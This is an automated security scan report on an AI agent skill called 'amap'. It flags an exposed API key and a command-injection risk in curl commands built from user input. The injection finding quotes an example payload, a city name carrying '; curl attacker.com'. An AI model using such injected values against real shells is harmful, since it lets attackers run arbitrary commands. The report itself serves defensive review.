# Agent Skill Security Scan Report

**Skill:** amap
**Directory:** /workspace/skills/clawhub-amap
**Status:** [OK] SAFE
**Max Severity:** MEDIUM
**Scan Duration:** 31.77s
**Timestamp:** 2026-02-05T19:20:18.874304

## Summary

- **Total Findings:** 2
- **Critical:** 0
- **High:** 0
- **Medium:** 2
- **Low:** 0
- **Info:** 0

## Findings

### MEDIUM Severity

#### [MEDIUM] Hardcoded API Key in Environment Variable Without Validation

**Severity:** MEDIUM
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill requires users to set AMAP_KEY as an environment variable and uses it directly in curl commands without any validation, sanitization, or secure handling. The API key is exposed in command-line arguments (visible in process listings) and could be logged or leaked through various system monitoring tools. Additionally, there is no guidance on key rotation, scope limitation, or secure storage practices.

#### [MEDIUM] Command Injection Risk via Unsanitized User Input in curl Commands

**Severity:** MEDIUM
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** All curl commands directly interpolate user-provided input (keywords, city names, addresses, coordinates) into URLs without any sanitization or validation. An attacker could inject shell metacharacters or additional curl parameters through user input, potentially leading to command injection. For example, a malicious city name like '北京; curl attacker.com' could execute arbitrary commands.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
